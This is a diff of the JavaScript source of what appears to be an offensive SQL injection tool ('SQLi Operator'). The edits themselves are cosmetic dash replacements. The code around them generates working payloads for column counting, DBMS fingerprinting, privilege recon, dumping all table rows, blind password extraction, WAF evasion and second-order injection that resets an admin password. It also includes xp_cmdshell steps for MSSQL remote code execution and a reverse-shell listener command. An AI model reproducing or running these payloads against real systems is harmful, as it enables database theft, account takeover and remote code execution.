+        payloads.push({payload:`${prefix} UNION SELECT ${pNull} ${comment}`,desc:`NULL everywhere except col ${i} - strict type check`});
       }
       // Concatenated version info
       payloads.push({payload:'━━━ Version in each position (confirm + fingerprint) ━━━',desc:''});
       for(let i=1;i<=Math.min(cols,6);i++) {
         const p2 = Array.from({length:cols},(_,j)=>j+1===i?`@@version`:`${j+1}`).join(',');
-        payloads.push({payload:`${prefix} UNION SELECT ${p2} ${comment}`,desc:`@@version in col ${i} (MySQL/MSSQL) — if it renders, use col ${i}`});
+        payloads.push({payload:`${prefix} UNION SELECT ${p2} ${comment}`,desc:`@@version in col ${i} (MySQL/MSSQL) - if it renders, use col ${i}`});
       }
       break;
     }
@@ -2651,36 +2651,36 @@ function buildUehStepPayloads(step, cfg, meta) {
       title = '🧬 Step 3: Fingerprint DBMS';
       notes = 'MySQL: @@version contains "MySQL/MariaDB". PostgreSQL: version() returns "PostgreSQL". MSSQL: @@version contains "Microsoft SQL Server". Oracle: FROM dual required. SQLite: sqlite_version() works.';
       payloads.push({payload:'━━━ Version Strings ━━━',desc:''});
-      payloads.push({payload:mk('@@version'),desc:'MySQL / MSSQL — @@version'});
-      payloads.push({payload:mk('version()'),desc:'PostgreSQL / MySQL — version()'});
-      payloads.push({payload:mk('sqlite_version()'),desc:'SQLite — sqlite_version()'});
-      payloads.push({payload:mk("(SELECT banner FROM v$version WHERE ROWNUM=1)"),desc:'Oracle — v$version banner'});
+      payloads.push({payload:mk('@@version'),desc:'MySQL / MSSQL - @@version'});
+      payloads.push({payload:mk('version()'),desc:'PostgreSQL / MySQL - version()'});
+      payloads.push({payload:mk('sqlite_version()'),desc:'SQLite - sqlite_version()'});
+      payloads.push({payload:mk("(SELECT banner FROM v$version WHERE ROWNUM=1)"),desc:'Oracle - v$version banner'});
       // Combined fingerprint
       payloads.push({payload:'━━━ Multi-info Fingerprint ━━━',desc:''});
-      payloads.push({payload:mk("CONCAT(@@version,0x7e,database(),0x7e,user())"),desc:'MySQL — version~db~user combined'});
-      payloads.push({payload:mk("version()||'~'||current_database()||'~'||current_user"),desc:'PostgreSQL — version~db~user'});
-      payloads.push({payload:mk("@@version+'~'+DB_NAME()+'~'+USER_NAME()"),desc:'MSSQL — version~db~user'});
-      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?"(SELECT banner FROM v$version WHERE ROWNUM=1)":'NULL').join(',')} FROM DUAL ${comment}`,desc:'Oracle — banner from DUAL'});
+      payloads.push({payload:mk("CONCAT(@@version,0x7e,database(),0x7e,user())"),desc:'MySQL - version~db~user combined'});
+      payloads.push({payload:mk("version()||'~'||current_database()||'~'||current_user"),desc:'PostgreSQL - version~db~user'});
+      payloads.push({payload:mk("@@version+'~'+DB_NAME()+'~'+USER_NAME()"),desc:'MSSQL - version~db~user'});
+      payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?"(SELECT banner FROM v$version WHERE ROWNUM=1)":'NULL').join(',')} FROM DUAL ${comment}`,desc:'Oracle - banner from DUAL'});
       // System info
       payloads.push({payload:'━━━ System Context ━━━',desc:''});
-      payloads.push({payload:mk(m.current_db),desc:`${m.name} — current database`});
-      payloads.push({payload:mk(m.current_user),desc:`${m.name} — current user`});
-      payloads.push({payload:mk(m.hostname),desc:`${m.name} — hostname`});
-      payloads.push({payload:mk('@@datadir'),desc:'MySQL — data directory'});
-      payloads.push({payload:mk('@@global.secure_file_priv'),desc:'MySQL — secure_file_priv'});
-      payloads.push({payload:mk('@@version_compile_os'),desc:'MySQL — compiled OS'});
-      payloads.push({payload:mk("(SELECT setting FROM pg_settings WHERE name='data_directory')"),desc:'PostgreSQL — data directory'});
-      payloads.push({payload:mk('@@SERVERNAME'),desc:'MSSQL — server name'});
-      payloads.push({payload:mk("CAST(is_srvrolemember('sysadmin') AS varchar)"),desc:'MSSQL — is sysadmin? (1=yes)'});
-      payloads.push({payload:mk("(SELECT value FROM v$parameter WHERE name='db_create_file_dest')"),desc:'Oracle — data directory'});
-      payloads.push({payload:mk("(SELECT file FROM pragma_database_list LIMIT 1)"),desc:'SQLite — database file path'});
+      payloads.push({payload:mk(m.current_db),desc:`${m.name} - current database`});
+      payloads.push({payload:mk(m.current_user),desc:`${m.name} - current user`});
+      payloads.push({payload:mk(m.hostname),desc:`${m.name} - hostname`});
+      payloads.push({payload:mk('@@datadir'),desc:'MySQL - data directory'});
+      payloads.push({payload:mk('@@global.secure_file_priv'),desc:'MySQL - secure_file_priv'});
+      payloads.push({payload:mk('@@version_compile_os'),desc:'MySQL - compiled OS'});
+      payloads.push({payload:mk("(SELECT setting FROM pg_settings WHERE name='data_directory')"),desc:'PostgreSQL - data directory'});
+      payloads.push({payload:mk('@@SERVERNAME'),desc:'MSSQL - server name'});
+      payloads.push({payload:mk("CAST(is_srvrolemember('sysadmin') AS varchar)"),desc:'MSSQL - is sysadmin? (1=yes)'});
+      payloads.push({payload:mk("(SELECT value FROM v$parameter WHERE name='db_create_file_dest')"),desc:'Oracle - data directory'});
+      payloads.push({payload:mk("(SELECT file FROM pragma_database_list LIMIT 1)"),desc:'SQLite - database file path'});
       // Privilege checks
       payloads.push({payload:'━━━ Privilege Recon ━━━',desc:''});
-      payloads.push({payload:mk('super_priv')+` FROM mysql.user WHERE user=user() ${comment}`,desc:'MySQL — SUPER privilege (Y/N)'});
-      payloads.push({payload:mk("(SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",user(),\"'\"))"),desc:'MySQL — all privileges'});
-      payloads.push({payload:mk("(SELECT string_agg(rolname,',') FROM pg_roles WHERE pg_has_role(current_user,rolname,'member'))"),desc:'PostgreSQL — roles of current user'});
-      payloads.push({payload:mk("(SELECT string_agg(permission_name,',') FROM sys.fn_my_permissions(NULL,'SERVER'))"),desc:'MSSQL — server permissions'});
-      payloads.push({payload:mk("(SELECT listagg(privilege,',') WITHIN GROUP (ORDER BY 1) FROM user_sys_privs)")+' FROM DUAL '+comment,desc:'Oracle — user system privileges'});
+      payloads.push({payload:mk('super_priv')+` FROM mysql.user WHERE user=user() ${comment}`,desc:'MySQL - SUPER privilege (Y/N)'});
+      payloads.push({payload:mk("(SELECT GROUP_CONCAT(privilege_type) FROM information_schema.user_privileges WHERE grantee=CONCAT(\"'\",user(),\"'\"))"),desc:'MySQL - all privileges'});
+      payloads.push({payload:mk("(SELECT string_agg(rolname,',') FROM pg_roles WHERE pg_has_role(current_user,rolname,'member'))"),desc:'PostgreSQL - roles of current user'});
+      payloads.push({payload:mk("(SELECT string_agg(permission_name,',') FROM sys.fn_my_permissions(NULL,'SERVER'))"),desc:'MSSQL - server permissions'});
+      payloads.push({payload:mk("(SELECT listagg(privilege,',') WITHIN GROUP (ORDER BY 1) FROM user_sys_privs)")+' FROM DUAL '+comment,desc:'Oracle - user system privileges'});
       break;
     }
 
@@ -2713,8 +2713,8 @@ function buildUehStepPayloads(step, cfg, meta) {
 
       } else if(cfg.dbms==='mssql') {
         payloads.push({payload:'━━━ MSSQL: List All Databases ━━━',desc:''});
-        payloads.push({payload:mkFromAll("(SELECT STRING_AGG(name,', ') FROM sys.databases)","(SELECT 1 AS x) t"),desc:'All databases (STRING_AGG — SQL 2017+)'});
-        payloads.push({payload:mkFromAll("(SELECT stuff((SELECT ','+name FROM sys.databases FOR XML PATH(''),TYPE).value('.','varchar(max)'),1,1,''))","(SELECT 1 AS x) t"),desc:'All databases (FOR XML PATH — all versions)'});
+        payloads.push({payload:mkFromAll("(SELECT STRING_AGG(name,', ') FROM sys.databases)","(SELECT 1 AS x) t"),desc:'All databases (STRING_AGG - SQL 2017+)'});
+        payloads.push({payload:mkFromAll("(SELECT stuff((SELECT ','+name FROM sys.databases FOR XML PATH(''),TYPE).value('.','varchar(max)'),1,1,''))","(SELECT 1 AS x) t"),desc:'All databases (FOR XML PATH - all versions)'});
         payloads.push({payload:mkFrom("name","sys.databases","name NOT IN ('master','model','msdb','tempdb')"),desc:'User databases only'});
         payloads.push({payload:mk("DB_NAME()"),desc:'Current database'});
         payloads.push({payload:mk("DB_NAME()+'~'+@@SERVERNAME+'~'+SYSTEM_USER"),desc:'DB + server + user'});
@@ -2853,8 +2853,8 @@ function buildUehStepPayloads(step, cfg, meta) {
 
       if(cfg.dbms==='mysql') {
         payloads.push({payload:'━━━ MySQL: Extract All Rows ━━━',desc:''});
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`GROUP_CONCAT(${cExpr} SEPARATOR 0x0a)`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows — ${colStr} (newline-sep)`});
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`GROUP_CONCAT(${cExpr} SEPARATOR 0x7e7e)`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows — ${colStr} (~~-sep, avoids line breaks)`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`GROUP_CONCAT(${cExpr} SEPARATOR 0x0a)`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows - ${colStr} (newline-sep)`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`GROUP_CONCAT(${cExpr} SEPARATOR 0x7e7e)`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows - ${colStr} (~~-sep, avoids line breaks)`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`GROUP_CONCAT(${cExpr} ORDER BY ${colArr[0]||'id'} SEPARATOR 0x0a)`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:'All rows ordered'});
         payloads.push({payload:'━━━ Row-by-Row Pagination ━━━',desc:''});
         for(let r=0;r<8;r++) payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`CONCAT(${cExpr})`:'NULL').join(',')} FROM ${fromRef} LIMIT ${r},1 ${comment}`,desc:`Row ${r+1} only`});
@@ -2867,7 +2867,7 @@ function buildUehStepPayloads(step, cfg, meta) {
 
       } else if(cfg.dbms==='pgsql') {
         payloads.push({payload:'━━━ PostgreSQL: Extract All Rows ━━━',desc:''});
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`string_agg(${colArr.join("||':'||")},chr(10))`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows — ${colStr} (newline-sep)`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`string_agg(${colArr.join("||':'||")},chr(10))`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows - ${colStr} (newline-sep)`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`string_agg(${colArr.join("||'~'||")},'~~')`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows (tilde-sep)`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`(${colArr.join("||':'||")})`:'NULL').join(',')} FROM ${fromRef} LIMIT 1 OFFSET 0 ${comment}`,desc:'Row 1'});
         for(let r=0;r<6;r++) payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')} FROM ${fromRef} LIMIT 1 OFFSET ${r} ${comment}`,desc:`Row ${r+1} (OFFSET paginate)`});
@@ -2883,13 +2883,13 @@ function buildUehStepPayloads(step, cfg, meta) {
 
       } else if(cfg.dbms==='oracle') {
         payloads.push({payload:'━━━ Oracle: Extract All Rows ━━━',desc:''});
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`(SELECT listagg(${colArr.join("||':'||")},chr(10)) WITHIN GROUP (ORDER BY 1) FROM ${fromRef})`:'NULL').join(',')} FROM DUAL ${comment}`,desc:`All rows — ${colStr} (LISTAGG)`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`(SELECT listagg(${colArr.join("||':'||")},chr(10)) WITHIN GROUP (ORDER BY 1) FROM ${fromRef})`:'NULL').join(',')} FROM DUAL ${comment}`,desc:`All rows - ${colStr} (LISTAGG)`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')} FROM ${fromRef} WHERE ROWNUM=1 ${comment}`,desc:'Row 1 (ROWNUM=1)'});
         for(let r=1;r<=6;r++) payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')} FROM ${fromRef} WHERE ROWNUM<=${r}${r>1?' MINUS SELECT '+Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')+' FROM '+fromRef+' WHERE ROWNUM<='+(r-1):''} ${comment}`,desc:`Row ${r}`});
 
       } else if(cfg.dbms==='sqlite') {
         payloads.push({payload:'━━━ SQLite: Extract All Rows ━━━',desc:''});
-        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`group_concat(${colArr.join("||':'||")},char(10))`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows — ${colStr}`});
+        payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`group_concat(${colArr.join("||':'||")},char(10))`:'NULL').join(',')} FROM ${fromRef} ${comment}`,desc:`All rows - ${colStr}`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')} FROM ${fromRef} LIMIT 1 OFFSET 0 ${comment}`,desc:'Row 1'});
         for(let r=0;r<6;r++) payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?colArr.join("||':'||"):'NULL').join(',')} FROM ${fromRef} LIMIT 1 OFFSET ${r} ${comment}`,desc:`Row ${r+1}`});
         payloads.push({payload:`${prefix} UNION SELECT ${Array.from({length:cols},(_,i)=>i+1===vis?`hex(${colArr[1]||'password'})`:'NULL').join(',')} FROM ${fromRef} LIMIT 1 ${comment}`,desc:'Hex-encode password (binary-safe)'});
@@ -2905,7 +2905,7 @@ function uehExportWorkflow() {
   const cfg = uehCfg();
   const meta = DBMS_META[cfg.dbms]||DBMS_META.mysql;
   const lines = [
-    `# SQLi Enumeration Workflow — SQLi Operator`,
+    `# SQLi Enumeration Workflow - SQLi Operator`,
     `# DBMS: ${meta.name} | Cols: ${cfg.cols} | Visible: ${cfg.vis} | Prefix: ${cfg.prefix} | Comment: ${cfg.comment}`,
     `# Target: ${cfg.db||'?'}.${cfg.table||'?'} | Extract: ${cfg.targetCols||'?'}`,
     ``,
@@ -2970,9 +2970,9 @@ function pdGenerate() {
   const timeSweep = genTimeSweep(params, dbms, prefix, comment, sleep);
   const errSweep = genErrorSweep(params, dbms, prefix, comment);
   const boolSweep = genBoolSweep(params, prefix, comment);
-  out.innerHTML = buildSection(`⏱️ SWEEP A — Time-Based (${sleep}s delay = injectable)`, timeSweep)
-    + buildSection('💥 SWEEP B — Error-Based (SQL error = injectable)', errSweep)
-    + buildSection('🔀 SWEEP C — Boolean (page difference = injectable)', boolSweep);
+  out.innerHTML = buildSection(`⏱️ SWEEP A - Time-Based (${sleep}s delay = injectable)`, timeSweep)
+    + buildSection('💥 SWEEP B - Error-Based (SQL error = injectable)', errSweep)
+    + buildSection('🔀 SWEEP C - Boolean (page difference = injectable)', boolSweep);
   showNotif(`Generated ${timeSweep.length+errSweep.length+boolSweep.length} payloads`,'success');
 }
 
@@ -3052,7 +3052,7 @@ function rceTab(btn, dbms) {
 }
 
 // ═══════════════════════════════════════════════
-// PAYLOAD CORRECTOR — 23 SCENARIOS (from v2)
+// PAYLOAD CORRECTOR - 23 SCENARIOS (from v2)
 // ═══════════════════════════════════════════════
 function initCorrector() { /* no-op, ready to use */ }
 
@@ -3121,7 +3121,7 @@ function corrScen_paramDisc(cfg) {
 }
 function corrScen_typeMismatch(cfg) {
   const payloads = [];
-  for(let i=1;i<=12;i++) payloads.push({payload:`${cfg.prefix} UNION SELECT ${Array(i).fill('NULL').join(',')}${cfg.comment}`,desc:`UNION ${i} NULLs — success = correct count`});
+  for(let i=1;i<=12;i++) payloads.push({payload:`${cfg.prefix} UNION SELECT ${Array(i).fill('NULL').join(',')}${cfg.comment}`,desc:`UNION ${i} NULLs - success = correct count`});
   if(cfg.cols>0) {
     payloads.push({payload:'═══ STRING POSITION TEST ═══',desc:'Find renderable column'});
     for(let i=1;i<=cfg.cols;i++){const parts=Array(cfg.cols).fill('NULL');parts[i-1]="'test'";payloads.push({payload:`${cfg.prefix} UNION SELECT ${parts.join(',')}${cfg.comment}`,desc:`String in pos ${i}`});}
@@ -3141,7 +3141,7 @@ function corrScen_colCount(cfg) {
   for(let i=1;i<=20;i++) payloads.push({payload:`${cfg.prefix} ORDER BY ${i}${cfg.comment}`,desc:`ORDER BY ${i}`});
   payloads.push({payload:'═══ UNION NULL METHOD ═══',desc:'Alternative'});
   for(let i=1;i<=15;i++) payloads.push({payload:`${cfg.prefix} UNION SELECT ${Array(i).fill('NULL').join(',')}${cfg.comment}`,desc:`${i} column(s)`});
-  return {diagnosis:`Column count mismatch.<br><br><strong>ORDER BY:</strong> Increment until error — last success = count.<br><strong>UNION NULL:</strong> Add NULLs until no error.`,payloads,nextSteps:[{payload:'After count confirmed, find visible columns',desc:'Replace NULLs with numbers/strings'}]};
+  return {diagnosis:`Column count mismatch.<br><br><strong>ORDER BY:</strong> Increment until error - last success = count.<br><strong>UNION NULL:</strong> Add NULLs until no error.`,payloads,nextSteps:[{payload:'After count confirmed, find visible columns',desc:'Replace NULLs with numbers/strings'}]};
 }
 function corrScen_castChain(cfg) {
   return {diagnosis:`CAST/CONVERT error-based confirmed. Walk through the full chain:<br>1. Fingerprint: version, user, database<br>2. Tables<br>3. Columns<br>4. Extract data row by row<br>5. Check privileges<br>6. RCE if privileged`,payloads:genCastChain(cfg.params,0,cfg.dbms,cfg.table,cfg.columns),nextSteps:[{payload:'Check superuser next',desc:'Required for file read/write and RCE'},{payload:'Use SUBSTRING for long values',desc:'Error output truncated at ~32 chars (MySQL) or ~64 (PgSQL)'}]};
@@ -3169,7 +3169,7 @@ function corrScen_dataEmpty(cfg) {
 }
 function corrScen_blindOptimized(cfg) {
   return {diagnosis:`Timing unreliable due to network jitter.<br><br><strong>Strategies:</strong><br>1. Increase delay to 10s<br>2. Binary bisection (7 requests/char)<br>3. Character class detection<br>4. Consider OOB if timing remains unreliable`,payloads:[
-    {payload:`${cfg.prefix} AND IF(1=1,SLEEP(10),0)${cfg.comment}`,desc:'10s delay — clearer signal'},
+    {payload:`${cfg.prefix} AND IF(1=1,SLEEP(10),0)${cfg.comment}`,desc:'10s delay - clearer signal'},
     {payload:`${cfg.prefix} AND IF(ASCII(SUBSTRING((SELECT password FROM ${cfg.table||'users'} LIMIT 0,1),1,1))>64,SLEEP(5),0)${cfg.comment}`,desc:'Binary: > 64?'},
     {payload:`${cfg.prefix} AND IF(ASCII(SUBSTRING((SELECT password FROM ${cfg.table||'users'} LIMIT 0,1),1,1))>96,SLEEP(5),0)${cfg.comment}`,desc:'Binary: > 96?'},
     {payload:`${cfg.prefix} AND IF(ASCII(SUBSTRING((SELECT password FROM ${cfg.table||'users'} LIMIT 0,1),1,1)) BETWEEN 97 AND 122,SLEEP(5),0)${cfg.comment}`,desc:'Is lowercase (a-z)?'},
@@ -3177,7 +3177,7 @@ function corrScen_blindOptimized(cfg) {
   ],nextSteps:[{payload:'Consider OOB if timing remains inconsistent',desc:'DNS/HTTP may be faster and more reliable'}]};
 }
 function corrScen_sqlite(cfg) {
-  return {diagnosis:`<strong>SQLite has NO information_schema!</strong><br><br>Metadata from:<br>• sqlite_master — tables, CREATE DDL<br>• pragma_table_info('table') — columns<br>• pragma_database_list — attached DBs<br><br>RCE: ATTACH DATABASE to webroot or load_extension()`,payloads:[
+  return {diagnosis:`<strong>SQLite has NO information_schema!</strong><br><br>Metadata from:<br>• sqlite_master - tables, CREATE DDL<br>• pragma_table_info('table') - columns<br>• pragma_database_list - attached DBs<br><br>RCE: ATTACH DATABASE to webroot or load_extension()`,payloads:[
     {payload:"' AND typeof(1)='integer'-- -",desc:'SQLite fingerprint'},
     {payload:"' UNION SELECT sqlite_version(),NULL-- -",desc:'Version'},
     {payload:"' AND sqlite_compileoption_used('ENABLE_LOAD_EXTENSION')=1-- -",desc:'load_extension enabled?'},
@@ -3197,8 +3197,8 @@ function corrScen_waf(cfg) {
     {payload:`${cfg.prefix} UN/**/ION SE/**/LECT 1,2,3${cfg.comment}`,desc:'Split keywords'},
     {payload:`${cfg.prefix} /*!50000UNION*/ /*!50000SELECT*/ 1,2,3${cfg.comment}`,desc:'Version comments'},
     {payload:`${cfg.prefix} uNiOn SeLeCt 1,2,3${cfg.comment}`,desc:'Random case'},
-    {payload:`${cfg.prefix} AND SLEEP(5)${cfg.comment}`,desc:'Time-based pivot — only needs SLEEP keyword'},
-    {payload:`${cfg.prefix} UNION ALL SELECT 1,2,3${cfg.comment}`,desc:'UNION ALL — may bypass UNION-only filter'},
+    {payload:`${cfg.prefix} AND SLEEP(5)${cfg.comment}`,desc:'Time-based pivot - only needs SLEEP keyword'},
+    {payload:`${cfg.prefix} UNION ALL SELECT 1,2,3${cfg.comment}`,desc:'UNION ALL - may bypass UNION-only filter'},
     {payload:`${cfg.prefix} AND 0x31=0x31${cfg.comment}`,desc:'Hex literal comparison'},
   ],nextSteps:[{payload:'If all blocked, try OOB',desc:'DNS may completely bypass WAF filters'}],pivot:`If UNION/SELECT hard-blocked, pivot to <strong>time-based blind</strong>. If that fails, try <strong>OOB DNS exfil</strong>.`};
 }
@@ -3215,7 +3215,7 @@ function corrScen_pgRCE(cfg) {
   ],nextSteps:[{payload:'nc -lvnp 4444',desc:'Start listener before firing reverse shell'}]};
 }
 function corrScen_mssqlRCE(cfg) {
-  return {diagnosis:`MSSQL RCE via xp_cmdshell requires <strong>sysadmin</strong>.<br><br>xp_cmdshell disabled by default — need two RECONFIGURE calls.`,payloads:[
+  return {diagnosis:`MSSQL RCE via xp_cmdshell requires <strong>sysadmin</strong>.<br><br>xp_cmdshell disabled by default - need two RECONFIGURE calls.`,payloads:[
     {payload:"'; EXEC sp_configure 'show advanced options',1; RECONFIGURE-- -",desc:'Step 1: Enable advanced options'},
     {payload:"'; EXEC sp_configure 'xp_cmdshell',1; RECONFIGURE-- -",desc:'Step 2: Enable xp_cmdshell'},
     {payload:"'; EXEC xp_cmdshell 'whoami'-- -",desc:'Test: whoami'},
@@ -3257,7 +3257,7 @@ function corrScen_jsonInject(cfg) {
   ],nextSteps:[{payload:'Set Content-Type: application/json in Burp',desc:'Ensure server parses as JSON not form data'}]};
 }
 function corrScen_headerInjectScen(cfg) {
-  return {diagnosis:`Apps log HTTP headers for analytics/access logs.<br><br><strong>Common targets:</strong><br>• X-Forwarded-For — IP logging<br>• User-Agent — analytics<br>• Referer — tracking<br>• Cookie — session`,payloads:[
+  return {diagnosis:`Apps log HTTP headers for analytics/access logs.<br><br><strong>Common targets:</strong><br>• X-Forwarded-For - IP logging<br>• User-Agent - analytics<br>• Referer - tracking<br>• Cookie - session`,payloads:[
     {payload:`X-Forwarded-For: ' AND 1=1${cfg.comment}`,desc:'XFF Boolean TRUE'},
     {payload:`X-Forwarded-For: ' AND SLEEP(5)${cfg.comment}`,desc:'XFF Time-based'},
     {payload:`X-Forwarded-For: ' AND EXTRACTVALUE(1,CONCAT(0x7e,version()))${cfg.comment}`,desc:'XFF Error-based (MySQL)'},
@@ -3290,7 +3290,7 @@ function corrScen_oob(cfg) {
   ],nextSteps:[{payload:'Use Burp Collaborator or interactsh for OOB detection',desc:'Easiest way to catch DNS/HTTP callbacks'}]};
 }
 function corrScen_xpathError(cfg) {
-  return {diagnosis:`<strong>XPath is NOT SQL!</strong> Different syntax entirely.<br><br>XPath is boolean-based only — no UNION, no SLEEP, no error extraction.<br><br><strong>Key functions:</strong><br>• substring() not SUBSTRING()<br>• string-length() not LENGTH()<br>• name() for element names`,payloads:[
+  return {diagnosis:`<strong>XPath is NOT SQL!</strong> Different syntax entirely.<br><br>XPath is boolean-based only - no UNION, no SLEEP, no error extraction.<br><br><strong>Key functions:</strong><br>• substring() not SUBSTRING()<br>• string-length() not LENGTH()<br>• name() for element names`,payloads:[
     {payload:"' or '1'='1",desc:'Boolean bypass'},
     {payload:"' or ''='",desc:'Empty string equality'},
     {payload:"x' or name()='password",desc:'Element name check'},
@@ -3326,7 +3326,7 @@ function generateStackedPayloads() {
   const sleep = parseInt(document.getElementById('stk-sleep').value)||5;
   const payloads = [];
   if(dbms==='oracle') {
-    payloads.push({payload:'Oracle does not support stacked queries via ; — use time-based blind or OOB',desc:'Oracle limitation'});
+    payloads.push({payload:'Oracle does not support stacked queries via ; - use time-based blind or OOB',desc:'Oracle limitation'});
   } else {
     const sf = dbms==='mssql'?`WAITFOR DELAY '00:00:${String(sleep).padStart(2,'0')}'`:dbms==='pgsql'?`pg_sleep(${sleep})`:`SLEEP(${sleep})`;
     payloads.push({payload:`${p}; ${stmt}${c}`,desc:'Basic stacked statement execution'});
@@ -3439,13 +3439,13 @@ function generateOrderByPayloads() {
   const cols=parseInt(document.getElementById('ord-cols').value)||3;
   const payloads=[];
   const sf={mysql:`SLEEP(${sleep})`,pgsql:`pg_sleep(${sleep})`,mssql:`(SELECT 1 WHERE 1=(SELECT 1 WHERE WAITFOR DELAY '00:00:${String(sleep).padStart(2,'0')}'))`,oracle:`DBMS_PIPE.RECEIVE_MESSAGE(CHR(97),${sleep})`}[dbms]||`SLEEP(${sleep})`;
-  payloads.push({payload:'1',desc:'Baseline — confirm column 1 valid'});
+  payloads.push({payload:'1',desc:'Baseline - confirm column 1 valid'});
   payloads.push({payload:'1 ASC',desc:'Explicit ASC'});
-  payloads.push({payload:'1 DESC',desc:'Explicit DESC — compare with ASC'});
-  payloads.push({payload:`${cols+1}`,desc:`Out-of-range (${cols+1}) — error confirms ${cols} cols`});
-  payloads.push({payload:'CASE WHEN (1=1) THEN 1 ELSE 2 END',desc:'CASE boolean — true returns col 1'});
-  payloads.push({payload:'CASE WHEN (1=2) THEN 1 ELSE 2 END',desc:'CASE boolean — false returns col 2'});
-  payloads.push({payload:`CASE WHEN (1=1) THEN ${sf} ELSE 1 END`,desc:`Time-based — ${sleep}s if true`});
+  payloads.push({payload:'1 DESC',desc:'Explicit DESC - compare with ASC'});
+  payloads.push({payload:`${cols+1}`,desc:`Out-of-range (${cols+1}) - error confirms ${cols} cols`});
+  payloads.push({payload:'CASE WHEN (1=1) THEN 1 ELSE 2 END',desc:'CASE boolean - true returns col 1'});
+  payloads.push({payload:'CASE WHEN (1=2) THEN 1 ELSE 2 END',desc:'CASE boolean - false returns col 2'});
+  payloads.push({payload:`CASE WHEN (1=1) THEN ${sf} ELSE 1 END`,desc:`Time-based - ${sleep}s if true`});
   payloads.push({payload:`(SELECT CASE WHEN (1=1) THEN ${sf} ELSE 1 END)`,desc:'Subquery-wrapped time test'});
   if(dbms==='mysql') { payloads.push({payload:`IF(1=1,${sf},1)`,desc:'MySQL IF() in ORDER BY'}); }
   document.getElementById('ord-output').innerHTML=buildSection('ORDER BY Injection Payloads',payloads);
@@ -3454,21 +3454,21 @@ function generateOrderByPayloads() {
 function initSecondOrderLib() {
   const el=document.getElementById('second-order-lib');
   if(!el||el.innerHTML) return;
-  el.innerHTML=buildSection('Registration Phase — Store the Payload',[
-    {payload:"admin'--",desc:"Username: comment truncation — login SELECT comments out password check"},
+  el.innerHTML=buildSection('Registration Phase - Store the Payload',[
+    {payload:"admin'--",desc:"Username: comment truncation - login SELECT comments out password check"},
     {payload:"' OR 1=1--",desc:'Username: boolean true stored'},
     {payload:"' UNION SELECT 1,password,3 FROM users--",desc:'Username: UNION fires when profile viewed'},
-    {payload:"'; UPDATE users SET password='hacked' WHERE username='admin'--",desc:'Stacked update — fires on retrieval'},
+    {payload:"'; UPDATE users SET password='hacked' WHERE username='admin'--",desc:'Stacked update - fires on retrieval'},
     {payload:"admin'/*",desc:'Inline comment truncation variant'},
     {payload:"1' AND '1'='1",desc:'Boolean that balances context'},
-  ])+buildSection('Trigger Phase — Execution Points',[
+  ])+buildSection('Trigger Phase - Execution Points',[
     {payload:"Password reset: UPDATE users SET password=? WHERE username='<stored>'",desc:'Stored username used in password reset UPDATE'},
     {payload:"Profile view: SELECT * FROM posts WHERE author='<stored>'",desc:'Feed page queries stored username'},
     {payload:"Admin search: SELECT * FROM users WHERE name='<stored>'",desc:'Admin panel searches stored display name'},
     {payload:"Email lookup: SELECT * FROM users WHERE email='<stored>'",desc:"Forgot password queries stored email"},
   ])+buildSection('Detection & Confirmation',[
     {payload:"admin'-- -",desc:'Register → login as admin (second-order confirmed)'},
-    {payload:"sleep_test' AND SLEEP(5)--",desc:'Register with sleep, trigger profile view — delay = confirmed'},
+    {payload:"sleep_test' AND SLEEP(5)--",desc:'Register with sleep, trigger profile view - delay = confirmed'},
     {payload:"1' AND '1'='1",desc:'Compare page response with true vs false stored value'},
   ]);
 }
@@ -3488,11 +3488,11 @@ function generateHeaderPayloads() {
